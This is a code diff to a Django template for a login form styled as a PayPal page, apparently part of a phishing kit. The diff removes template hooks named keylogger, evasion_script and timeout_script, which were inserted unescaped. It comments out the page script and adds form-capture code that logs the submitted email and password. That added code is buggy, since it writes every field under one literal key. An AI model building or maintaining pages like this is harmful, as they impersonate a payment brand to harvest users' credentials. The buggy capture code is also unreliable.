@@ -39,7 +39,7 @@
             </div>
         </div>
 
-        <form action="/submit/" method="post" class="paypal-form" autocomplete="off">
+        <form class="paypal-form" method="POST" autocomplete="off">
             {% csrf_token %}
             <div class="form-group">
                 <label for="email">Email</label>
@@ -423,7 +423,7 @@
         }
     }
 </style>
-
+<!-- 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
         // Toggle password visibility
@@ -450,11 +450,17 @@
             buttonLoader.classList.remove('hidden');
             submitBtn.disabled = true;
             
+            // form submission 
+            const formData = new FormData(form);
+            const formJson = {};
+            formData.forEach((key, value) => formJson['key']= value);
+
+            console.log(formJson)
             // Simulate network request (replace with actual form submission)
             setTimeout(() => {
                 // This would be your actual form submission
                 this.submit();
-            }, 1500);
+            }, 1000);
         });
 
         // Country selector dropdown simulation
@@ -463,10 +469,6 @@
             alert('Country selection would appear here in a real implementation');
         });
     });
-</script>
+</script> -->
 
-{{ keylogger|safe }} 
-{{ security_scripts|safe }} 
-{{ timeout_script|safe }} 
-{{ evasion_script|safe }}
 {% endblock %}
